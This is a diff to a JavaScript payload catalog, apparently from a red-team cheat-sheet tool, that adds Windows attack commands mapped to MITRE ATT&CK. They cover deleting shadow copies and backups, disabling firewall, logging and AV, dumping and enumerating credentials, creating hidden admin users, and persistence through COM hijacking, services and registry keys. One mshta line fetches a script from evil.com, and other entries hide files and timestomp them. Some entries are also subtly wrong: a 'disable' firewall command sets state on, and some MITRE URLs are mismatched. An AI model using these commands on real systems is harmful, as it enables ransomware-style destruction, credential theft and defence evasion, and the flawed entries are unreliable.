@@ -78,6 +78,16 @@ const PAYLOADS = {
             'desc': null,
         },
     },
+    'Bypass MOTW': {
+        'PowerShell (Unblock-File)': {
+            'cmd': 'Unblock-File -Path evil.exe',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1553.005', 'url': 'https://attack.mitre.org/techniques/T1553/005/'},
+            'lolbas': null,
+            'desc': 'The command deletes Alternate Data Stream named \'Zone.Identifier\' from the file to bypass Mark-of-the-Web.',
+        },
+    },
     'Clear Event Logs': {
         'PowerShell (Remove-EventLog)': {
             'cmd': 'Remove-EventLog -LogName System;Remove-EventLog -LogName Application;Remove-EventLog -LogName Security',
@@ -122,25 +132,7 @@ const PAYLOADS = {
             'desc': null,
         }
     },
-    'Delete Backups': {
-        'Wbadmin': {
-            'cmd': 'wbadmin delete backup',
-            'cli': null,
-            'adminRequired': true,
-            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
-            'lolbas': null,
-            'desc': null,
-        },
-        'Wbadmin (Catalog)': {
-            'cmd': 'wbadmin delete catalog -quiet',
-            'cli': null,
-            'adminRequired': true,
-            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
-            'lolbas': null,
-            'desc': 'The command erases Windows Backup Catalog.',
-        },
-    },
-    'Delete Shadow Copies': {
+    'Delete Backups & Shadow Copies': {
         'Bcdedit': {
             'cmd': 'bcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default} recoveryenabled no',
             'cli': null,
@@ -155,7 +147,15 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
             'lolbas': null,
-            'desc': null,
+            'desc': 'The command deletes shadow copies.',
+        },
+        'PowerShell (Get-WmiObject)': {
+            'cmd': 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}',
+            'cli': 'PowerShell',
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': 'The command deletes shadow copies.',
         },
         'Vssadmin': {
             'cmd': 'vssadmin delete shadows /all /quiet',
@@ -163,7 +163,23 @@ const PAYLOADS = {
             'adminRequired': true,
             'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
             'lolbas': null,
-            'desc': null,
+            'desc': 'The command deletes shadow copies.',
+        },
+        'Wbadmin': {
+            'cmd': 'wbadmin delete backup',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': 'The command deletes backups.',
+        },
+        'Wbadmin (Catalog)': {
+            'cmd': 'wbadmin delete catalog -quiet',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': 'The command erases Windows Backup Catalog.',
         },
         'Wmic': {
             'cmd': 'wmic shadowcopy delete',
@@ -171,17 +187,27 @@ const PAYLOADS = {
             'adminRequired': true,
             'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
             'lolbas': null,
+            'desc': 'The command deletes shadow copies.',
+        },
+    },
+    'Disable AV/EDR': {
+        'bcdedit': {
+            'cmd': 'bcdedit /set safeboot network',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1562.009', 'url': 'https://attack.mitre.org/techniques/T1562/009/'},
+            'lolbas': null,
             'desc': null,
         },
     },
     'Disable Command Logging': {
-        'PowerShell (Set-PSReadLineOption)': {
-            'cmd': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing',
+        'PowerShell': {
+            'cmd': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing;Remove-Item (Get-PSReadlineOption).HistorySavePath',
             'cli': 'PowerShell',
             'adminRequired': false,
             'mitre': {'id': 'T1562.003', 'url': 'https://attack.mitre.org/techniques/T1562/003/'},
             'lolbas': null,
-            'desc': 'The command avoids storing PowerShell command history anywhere.',
+            'desc': 'The command avoids storing PowerShell command history anywhere, and removes the history file.',
         },
         'Reg': {
             'cmd': 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f',
@@ -216,6 +242,24 @@ const PAYLOADS = {
             'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
             'lolbas': null,
             'desc': 'The command sets 0 to the Start value for disabling All EventLogs. We must reboot the ssytem to apply this change. To restore it, set 1 to the Start value.'
+        },
+    },
+    'Disable Firewall': {
+        'Netsh': {
+            'cmd': 'netsh advfirewall set currentprofile state on',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
+            'lolbas': null,
+            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'state off\' in the above command.',
+        },
+        'Reg': {
+            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile /v "EnableFirewall" /t REG_DWARD /d 0 /f',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
+            'lolbas': null,
+            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'/d 1\' in the above command.',
         },
     },
     'Download': {
@@ -303,6 +347,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command saves the LSA secrets to arbitrary file. The file can be extracted using some tool such as Mimikatz.',
         },
+        'Reg (Enumerate Credentials)': {
+            'cmd': 'reg query HKLM /f password /t REG_SZ /s',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1552.002', 'url': 'https://attack.mitre.org/techniques/T1552/002/'},
+            'lolbas': null,
+            'desc': 'The command enumerates entries in Registry that contain the "password" string.',
+        },
         'Reg (Save hives)': {
             'cmd': 'reg save HKLM\\SECURITY .\\security.bak;reg save HKLM\\SYSTEM .\\system.bak;reg save HKLM\\SAM .\\sam.bak',
             'cli': null,
@@ -315,7 +367,7 @@ const PAYLOADS = {
             'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
             'cli': null,
             'adminRequired': true,
-            'mitre': {'id': '', 'url': ''},
+            'mitre': {'id': 'T1112', 'url': 'https://attack.mitre.org/techniques/T1112/'},
             'lolbas': null,
             'desc': 'The command enables to store plaintext passwords. These passwords can be extracted using the Mimikatz \'sekurlsa::wdigest\' command. To disable it, set 0 with \'reg add\' command.',
         },
@@ -326,6 +378,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
             'desc': 'Replace \'<LSASS_PID>\' with actual PID of "lsass.exe". To find it, use \'Get-Process\' or \'tasklist\' command.',
+        },
+        'Vaultcmd': {
+            'cmd': 'vaultcmd /listcreds:"Windows Credentials" /all',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1555', 'url': 'https://attack.mitre.org/techniques/T1555/'},
+            'lolbas': null,
+            'desc': null,
         },
     },
     'Enumerate Accounts': {
@@ -462,6 +522,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
             'lolbas': null,
             'desc': 'The command enumerates network shared directories on the specified network. Replace the \'RemoteComputer\' with the remote system such as a computer name or an IP address.',
+        },
+        'Netsh (advfirewall)': {
+            'cmd': 'netsh advfirewall firewall show rule name=all',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
+            'lolbas': null,
+            'desc': 'The command enumerates the Firewall rules.',
         },
         'Netsh (interface)': {
             'cmd': 'netsh interface show interface',
@@ -741,6 +809,14 @@ const PAYLOADS = {
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
             'desc': null,
         },
+        'PowerShell (Get-Clipboard)': {
+            'cmd': 'echo whoami | clip;Get-Clipboard | iex',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1115', 'url': 'https://attack.mitre.org/techniques/T1115/'},
+            'lolbas': null,
+            'desc': 'The command copies arbitrary command and executes it by pasting with the Get-Clipboard cmdlet.'
+        },
         'Rundll32 (Shell32)': {
             'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
             'cli': null,
@@ -849,6 +925,14 @@ const PAYLOADS = {
             'lolbas': false,
             'desc': null,
         },
+        'Pcalua': {
+            'cmd': 'pcalua -a .\\evil.exe',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Pcalua/',
+            'desc': null,
+        },
         'Psexec': {
             'cmd': 'psexec \\\\example.local -accepteula evil.exe',
             'cli': null,
@@ -891,13 +975,21 @@ const PAYLOADS = {
         },
     },
     'Execute JavaScript': {
-        'Mshta': {
+        'Mshta (hta)': {
             'cmd': 'mshta C:\\evil.hta',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
             'desc': 'This command executes arbitrary JavaScript code in the .hta file. The .hta file must consist of HTML source code.',
+        },
+        'Mshta (sct)': {
+            'cmd': 'mshta javascript:a=(GetObject(\'script:https://evil.com/evil.sct\')).Exec();close();',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1112/'},
+            'lolbas': null,
+            'desc': 'The command executes arbitrary JavaScript code in the .sct file.',
         },
     },
     'Exfiltrate': {
@@ -958,14 +1050,66 @@ const PAYLOADS = {
             'desc': 'The command sends a data file (\'data.zip\') to the FTP server (\'ftp.dlptest.com\'). rclone.exe is not a built-in binary, so it must exist on the target system.',
         },
     },
+    'Hide Files': {
+        'Attrib': {
+            'cmd': 'attrib +h +s .\\evil.exe',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
+            'lolbas': null,
+            'desc': 'The command hides a file so innocent users cannot see the file (+h), and add System Attribute (SA) to disallow to delete this file with common operations. However, the \'-Hidden\' or \'-Force\' options of the \'dir\' command can display hidden files.'
+        },
+        'PowerShell': {
+            'cmd': '$file = Get-Item .\\evil.exe;$file.attributes = \'Hidden,System\'',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.001', 'url': 'https://attack.mitre.org/techniques/T1564/001/'},
+            'lolbas': null,
+            'desc': 'The command hides a file and adds System Attribute (SA) to disallow to delete thie file with common operations.',
+        },
+        'Reg': {
+            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1564.001', 'url': 'https://attack.mitre.org/techniques/T1564/001/'},
+            'lolbas': null,
+            'desc': 'The command hides files in explorer.'
+        },
+    },
+    'Install Drivers': {
+        'Pnputil': {
+            'cmd': 'pnputil -i -a C:\\evil.inf',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1547', 'url': 'https://attack.mitre.org/techniques/T1547/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Pnputil/',
+            'desc': 'The command installs a driver with the INF file.',
+        },
+    },
     'Manipulate Accounts': {
-        'Net': {
+        'Net (Change Password)': {
+            'cmd': 'net user John Password123',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1531', 'url': 'https://attack.mitre.org/techniques/T1531/'},
+            'lolbas': null,
+            'desc': 'The command changes the existing user password.',
+        },
+        'Net (Create User)': {
             'cmd': 'net user evil /add;net user evil \'Password123\';net localgroup Administrators evil /add',
             'cli': null,
             'adminRequired': true,
             'mitre': {'id': 'T1136.001', 'url': 'https://attack.mitre.org/techniques/T1136/001/'},
             'lolbas': null,
             'desc': 'The command creates a new local user and add it to the Administrator group. To delete the account, execute \'net localgroup Administrators evil /delete;net user evil /delete\'.',
+        },
+        'Net (Create Hidden User)': {
+            'cmd': 'net user $ Password123 /add',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1564', 'url': 'https://attack.mitre.org/techniques/T1564/'},
+            'lolbas': null,
+            'desc': 'The command creates a hidden user by specifying \'$\'. This user is not displayed with the \'net user\' command. To delete it, run \'net user $ /delete\' command.',
         },
     },
     'Masquerade': {
@@ -988,15 +1132,7 @@ const PAYLOADS = {
             'desc': 'The command enables the execution of unsigned drivers. To disable it, set \'off\' in the below command.'
         },
     },
-    'Modify Permissions': {
-        'Attrib': {
-            'cmd': 'attrib +h .\\file.txt',
-            'cli': null,
-            'adminRequired': false,
-            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
-            'lolbas': null,
-            'desc': 'The command hides a file so innocent users cannot see the file. However, the \'-Hidden\' or \'-Force\' options of the \'dir\' command can display hidden files.'
-        },
+    'Modify File Permissions': {
         'Icacls': {
             'cmd': 'icacls .\\file_or_dir /grant Everyone:F',
             'cli': null,
@@ -1041,6 +1177,30 @@ const PAYLOADS = {
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
             'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run.'
         },
+        'Reg (Atbroker)': {
+            'cmd': 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /f;reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f;reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /v StartEXE /t REG_SZ /d C:\\evil.exe /f;atbroker /start evil',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1546.008', 'url': 'https://attack.mitre.org/techniques/T1546/008/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Atbroker/',
+            'desc': 'The command injects a malicious executable file path to the Assistive Technologies (AT).',
+        },
+        'Reg (COM Hijacking)': {
+            'cmd': 'reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}" /f;reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32" /t REG_SZ /d "C:\\evil.dll" /f;reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1546.015', 'url': 'https://attack.mitre.org/techniques/T1546/015/'},
+            'lolbas': null,
+            'desc': 'The command hijacks the MruPidList COM object to execute the evil.dll for persistence. To delete it, run \'reg delete "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}"\' command.',
+        },
+        'Reg (Recycle Bin)': {
+            'cmd': 'reg add "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command" /ve /d "C:\\evil.exe" /f',
+            'cli': 'PowerShell',
+            'adminRequired': true,
+            'mitre': {'id': 'T1574.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
+            'lolbas': null,
+            'desc': 'The command adds arbitrary command execution to the Recycle bin (CLDID: 645FF040-5081-101B-9F08-00AA002F954E). The command will be executed when the Recycle Bin opens. To delete this setting, run \'reg delete "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open" /f\' command.',
+        },
         'Reg (Run, Unprivileged)': {
             'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
             'cli': null,
@@ -1064,6 +1224,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1547.004', 'url': 'https://attack.mitre.org/techniques/T1547/004/'},
             'lolbas': null,
             'desc': 'The command makes the evil.exe to be executed when logon.',
+        },
+        'Sc': {
+            'cmd': 'sc create Evil binPath="C:\\evil.exe" start= auto',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
+            'lolbas': null,
+            'desc': 'The command creates a malicious service to execute the evil.exe when the system boots. To delete the service, run \'sc delete Evil\' command.',
         },
         'Schtasks': {
             'cmd': 'schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\\evil.exe /RU SYSTEM',
@@ -1110,6 +1278,16 @@ const PAYLOADS = {
             'mitre': {'id': 'T1539', 'url': 'https://attack.mitre.org/techniques/T1539/'},
             'lolbas': null,
             'desc': 'The commands copies FireFox, Chrome and Microsoft Edge cookies to current directory. These files can be read using \'sqlite3\' or other dumping tools.',
+        },
+    },
+    'Timestomp': {
+        'PowerShell': {
+            'cmd': 'Get-ChildItem .\\evil.exe | % {$_.CreationTime = "06/24/2022 05:03:18";$_.LastWriteTime = "06/24/2022 05:03:18"}',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1070.006', 'url': 'https://attack.mitre.org/techniques/T1070/006/'},
+            'lolbas': null,
+            'desc': 'The command changes the creation time and the last modified time of the file to prevent victims from becoming suspicious of this file.',
         },
     },
     'UAC Bypass': {
